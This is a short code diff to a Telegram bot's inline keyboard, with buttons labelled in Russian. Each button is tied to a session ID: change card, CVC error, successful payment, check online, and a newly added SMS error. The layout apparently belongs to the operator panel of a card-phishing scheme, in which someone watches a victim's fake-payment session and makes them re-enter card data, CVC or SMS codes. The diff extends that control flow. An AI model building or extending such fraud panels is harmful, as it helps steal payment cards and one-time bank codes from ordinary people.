@@ -18,10 +18,11 @@ def get_management_keyboard(session_id: str):
         ],
         [
             InlineKeyboardButton(text="🔄 Изменить карту", callback_data=f"change:{session_id}"),
-            InlineKeyboardButton(text="❌ Неверный CVC", callback_data=f"wrong_cvc:{session_id}")
+            InlineKeyboardButton(text="❌ Ошибка CVC", callback_data=f"wrong_cvc:{session_id}")
         ],
         [
-            InlineKeyboardButton(text="✅ Успешная оплата", callback_data=f"success:{session_id}")
+            InlineKeyboardButton(text="✅ Успешная оплата", callback_data=f"success:{session_id}"),
+            InlineKeyboardButton(text="❌ Ошибка SMS", callback_data=f"wrong_sms:{session_id}")
         ],
         [
             InlineKeyboardButton(text="🔍 Проверить онлайн", callback_data=f"check_online:{session_id}")
